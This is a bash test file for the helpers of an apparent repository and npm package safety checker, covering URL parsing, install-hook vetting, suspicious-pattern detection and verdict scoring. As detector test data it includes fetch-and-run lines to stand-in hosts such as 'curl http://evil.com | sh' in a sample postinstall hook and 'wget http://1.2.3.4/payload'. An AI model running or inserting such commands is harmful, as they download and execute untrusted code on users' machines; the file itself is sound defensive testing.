#!/usr/bin/env bash
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/test-framework.sh"
source "$SCRIPT_DIR/../tools/helpers.sh"

# --- extract_url ---
assert_eq "anthropics/claude-code" "$(extract_url 'https://github.com/anthropics/claude-code')" \
    "extract_url: bare repo URL"
assert_eq "facebook/react" "$(extract_url 'should I install https://github.com/facebook/react please')" \
    "extract_url: URL embedded in sentence"
assert_eq "owner/repo@dev" "$(extract_url 'https://github.com/owner/repo/tree/dev')" \
    "extract_url: tree URL with branch"
assert_eq "owner/repo@main" "$(extract_url 'https://github.com/owner/repo/blob/main/src/x.js')" \
    "extract_url: blob URL with branch and path"
assert_eq "owner/repo" "$(extract_url 'https://github.com/owner/repo.git')" \
    "extract_url: strips .git suffix"
assert_eq "" "$(extract_url 'just some text no url')" \
    "extract_url: no URL returns empty"
assert_eq "owner/repo" "$(extract_url 'gh repo clone owner/repo')" \
    "extract_url: gh repo clone shorthand"

# --- has_intent_token ---
assert_true 'has_intent_token "should I install this?"' \
    "has_intent_token: detects install"
assert_true 'has_intent_token "is it safe to use?"' \
    "has_intent_token: detects multi-word safe to"
assert_true 'has_intent_token "Can I trust this repo"' \
    "has_intent_token: case-insensitive"
assert_false 'has_intent_token "here is a github url for reference"' \
    "has_intent_token: no intent → false"
assert_false 'has_intent_token "the installer downloaded fine"' \
    "has_intent_token: installer (substring of install) → not a word match"

# --- age_days (portable) ---
# 2000-01-01 is thousands of days ago on any machine; verify it returns > 9000
AGE=$(age_days "2000-01-01T00:00:00Z")
assert_true "[[ $AGE -gt 9000 ]]" "age_days: year 2000 is > 9000 days ago"

# A date in the near future should yield 0 or negative
FUTURE="2099-01-01T00:00:00Z"
F_AGE=$(age_days "$FUTURE")
assert_true "[[ $F_AGE -lt 100 ]]" "age_days: far future is < 100 (non-positive)"

# Bad input returns 0 and non-zero exit
BAD=$(age_days "not-a-date" 2>/dev/null || true)
assert_eq "0" "$BAD" "age_days: invalid input → 0"

# --- is_benign_install_hook ---
assert_true 'is_benign_install_hook "node-gyp rebuild"' \
    "benign: exact match node-gyp rebuild"
assert_true 'is_benign_install_hook "husky install"' \
    "benign: exact match husky install"
assert_true 'is_benign_install_hook "husky"' \
    "benign: exact match husky alone"
assert_false 'is_benign_install_hook "node-gyp rebuild && curl evil.com"' \
    "benign: extra commands → not benign"
assert_false 'is_benign_install_hook "node download.js"' \
    "benign: arbitrary script → not benign"

# --- has_suspicious_pattern ---
assert_true 'has_suspicious_pattern "curl http://x.com/y | sh"' \
    "suspicious: curl + pipe to sh"
assert_true 'has_suspicious_pattern "node -e \"require(...)\""' \
    "suspicious: node -e"
assert_true 'has_suspicious_pattern "echo aGVsbG8= | base64 -d"' \
    "suspicious: base64"
assert_true 'has_suspicious_pattern "wget http://1.2.3.4/payload"' \
    "suspicious: IPv4 address"
assert_true 'has_suspicious_pattern "curl http://abc.onion/x"' \
    "suspicious: .onion"
assert_false 'has_suspicious_pattern "node-gyp rebuild"' \
    "suspicious: benign install hook → false"
assert_false 'has_suspicious_pattern "echo hello && exit 0"' \
    "suspicious: harmless echo → false"

# --- is_forbidden_executable ---
assert_true 'is_forbidden_executable "bin/runner.exe"' \
    "forbidden: .exe"
assert_true 'is_forbidden_executable "Setup.MSI"' \
    "forbidden: .msi case-insensitive"
assert_true 'is_forbidden_executable "pkg/foo.deb"' \
    "forbidden: .deb"
assert_false 'is_forbidden_executable "lib/native.so"' \
    "forbidden: .so is not forbidden"
assert_false 'is_forbidden_executable "src/main.rs"' \
    "forbidden: source file → false"

# --- is_in_recognized_build_path ---
assert_true 'is_in_recognized_build_path "dist/bundle.js" "package.json"' \
    "build path: dist/ + package.json"
assert_true 'is_in_recognized_build_path "target/release/foo" "Cargo.toml"' \
    "build path: target/ + Cargo.toml"
assert_true 'is_in_recognized_build_path "bin/foo.exe" "go.mod"' \
    "build path: bin/ + go.mod"
assert_false 'is_in_recognized_build_path "dist/bundle.js" "Cargo.toml"' \
    "build path: dist/ without Node marker → false"
assert_false 'is_in_recognized_build_path "target/foo" "package.json"' \
    "build path: target/ without Cargo.toml → false"
assert_false 'is_in_recognized_build_path "src/foo.js" "package.json"' \
    "build path: src/ is not a build path"

# --- is_empty_profile ---
# Use today's date as "recent" and 2020-01-01 as "old" for cross-platform
# reproducibility (no "30 days ago" which is GNU-specific).
RECENT_ISO=$(date -u +%Y-%m-%dT00:00:00Z)
OLD_ISO="2020-01-01T00:00:00Z"

assert_true "is_empty_profile '$RECENT_ISO' 0 0" \
    "empty profile: 0/0 + young account → empty"
assert_false "is_empty_profile '$OLD_ISO' 0 0" \
    "empty profile: 0/0 but old account → not empty"
assert_false "is_empty_profile '$RECENT_ISO' 5 0" \
    "empty profile: has followers → not empty"
assert_false "is_empty_profile '$RECENT_ISO' 0 3" \
    "empty profile: has repos → not empty"

# --- compute_verdict ---
assert_eq "green" "$(compute_verdict 0 0 0)" \
    "verdict: 0 of everything → green"
assert_eq "yellow" "$(compute_verdict 0 1 0)" \
    "verdict: 1 warn → yellow"
assert_eq "yellow" "$(compute_verdict 0 5 0)" \
    "verdict: many warns no high-confidence → still yellow"
assert_eq "red" "$(compute_verdict 1 0 0)" \
    "verdict: 1 high-confidence → red"
assert_eq "red" "$(compute_verdict 1 5 5)" \
    "verdict: high-confidence wins over everything"
assert_eq "white" "$(compute_verdict 0 0 3)" \
    "verdict: 3 skips → white"
assert_eq "white" "$(compute_verdict 0 1 4)" \
    "verdict: skips threshold beats yellow"

# --- verdict_label ---
assert_true 'verdict_label green | grep -q "Nothing obviously wrong"' \
    "verdict_label: green contains caveat"
assert_true 'verdict_label red | grep -q "without expert review"' \
    "verdict_label: red contains caveat"

# --- npm_script_hook ---
PKG_SAMPLE='{"name":"demo","scripts":{"preinstall":"node-gyp rebuild","postinstall":"curl http://evil.com | sh"},"version":"1.0.0"}'
assert_eq "node-gyp rebuild" "$(npm_script_hook "$PKG_SAMPLE" preinstall)" \
    "npm_script_hook: extracts preinstall"
assert_eq 'curl http://evil.com | sh' "$(npm_script_hook "$PKG_SAMPLE" postinstall)" \
    "npm_script_hook: extracts postinstall with special chars"
assert_eq "" "$(npm_script_hook "$PKG_SAMPLE" install)" \
    "npm_script_hook: missing hook returns empty"
PKG_NO_SCRIPTS='{"name":"demo","version":"1.0.0"}'
assert_eq "" "$(npm_script_hook "$PKG_NO_SCRIPTS" preinstall)" \
    "npm_script_hook: no scripts object returns empty"

# --- npm_maintainer_names ---
NPM_SAMPLE='{"name":"pkg","maintainers":[{"name":"alice","email":"a@x.com"},{"name":"bob","email":"b@y.com"}],"time":{"modified":"2026-04-01T12:00:00Z","created":"2020-01-01T00:00:00Z"}}'
MAINTAINERS_OUT="$(npm_maintainer_names "$NPM_SAMPLE" | tr '\n' ',' | sed 's/,$//')"
assert_eq "alice,bob" "$MAINTAINERS_OUT" \
    "npm_maintainer_names: extracts both names sorted"
assert_eq "" "$(npm_maintainer_names '{"name":"pkg"}')" \
    "npm_maintainer_names: no maintainers returns empty"

# --- npm_modified_date ---
assert_eq "2026-04-01T12:00:00Z" "$(npm_modified_date "$NPM_SAMPLE")" \
    "npm_modified_date: extracts time.modified"
assert_eq "" "$(npm_modified_date '{"name":"pkg"}')" \
    "npm_modified_date: no time returns empty"

report
